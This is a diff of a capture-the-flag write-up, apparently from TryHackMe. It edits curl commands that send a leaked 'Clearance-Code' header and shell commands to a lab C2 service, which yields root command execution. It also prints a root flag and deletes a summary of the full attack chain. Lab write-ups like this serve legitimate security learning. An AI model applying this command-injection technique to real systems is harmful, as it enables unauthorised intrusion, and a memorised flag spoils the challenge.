@@ -164,14 +164,14 @@ So the server-side handler for `detective` blindly executes whatever shell comma
 With a valid `Clearance-Code` in hand, no need for the GUI client at all — just talk to the C2 endpoint directly with `curl`, swapping `detective` for the more literal `directive` parameter the service advertises:
 
 ```
-root@OSCP:/tmp# curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=whoami' 10.10.249.160:23023
+$ curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=whoami' 10.49.166.32:23023
 root
 ```
 
 Running as `root`. Confirmed and went straight for the flag:
 
 ```
-root@OSCP:/tmp# curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=ls -la /root' 10.10.249.160:23023
+$ curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=ls -la /root' 10.49.166.32:23023
 total 40
 drwx------  6 root root 4096 Oct 22 05:36 .
 drwxr-xr-x 19 root root 4096 Oct 21 01:33 ..
@@ -188,12 +188,3 @@ drwxr-xr-x  4 root root 4096 Oct 22 01:33 .ssh
 
 **root flag:** `thm{985bb3c88bfe66f9b465b00198692866}`
 
-## TL;DR chain
-
-1. `robots.txt` → `/datacubes` IDOR (numeric IDs, ffuf'd)
-2. `/datacubes/0451` → HMAC riddle for the VNC password
-3. `badactors.html` → username (`jlebedev`) used as the HMAC key
-4. HMAC-MD5 → VNC password → shell access as `ajacobson`
-5. `badactors-list` client on the desktop → talks to a Golang C2 on `:23023`
-6. Wireshark on the sync traffic → leaked `Clearance-Code` header + discovered the `directive`/`detective` param is executed server-side
-7. Direct `curl` with the leaked header → unauthenticated RCE as root
